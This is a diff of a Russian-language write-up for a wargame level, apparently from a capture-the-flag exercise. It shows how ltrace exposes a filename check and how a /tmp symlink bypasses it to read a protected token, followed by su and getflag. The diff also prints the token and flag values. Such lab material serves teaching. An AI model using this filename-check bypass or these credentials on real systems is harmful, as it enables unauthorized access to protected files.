@@ -1,7 +1,7 @@
 level08
 
-ls
-ltrace ./level08 token
+> ls
+> ltrace ./level08 token
 	__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
 	strstr("token", "token")                                                                = "token"
 	printf("You may not access '%s'\n", "token"You may not access 'token'
@@ -14,16 +14,17 @@ strstr("token", "token")
 
 Следовательно, нужно поменять имя файла токена
 У нас есть доступ к tmp папке, создадим в этой папке символьную ссылку на token:
-ln -s /home/user/level08/token /tmp/name
-#ln -s ~/token /tmp/name
+> ln -s /home/user/level08/token /tmp/name
 
 Запустим бинарник уже с нашей ссылкой:
-./level08 /tmp/name
+> ./level08 /tmp/name
+Получаем: quif5eloekouj29ke0vouxean
+
+> su flag08
 quif5eloekouj29ke0vouxean
 
-su flag08
-quif5eloekouj29ke0vouxean
-
-getflag
+> getflag
 25749xKZ8L7DkSCwJkT9dyv
+
+Done!
 
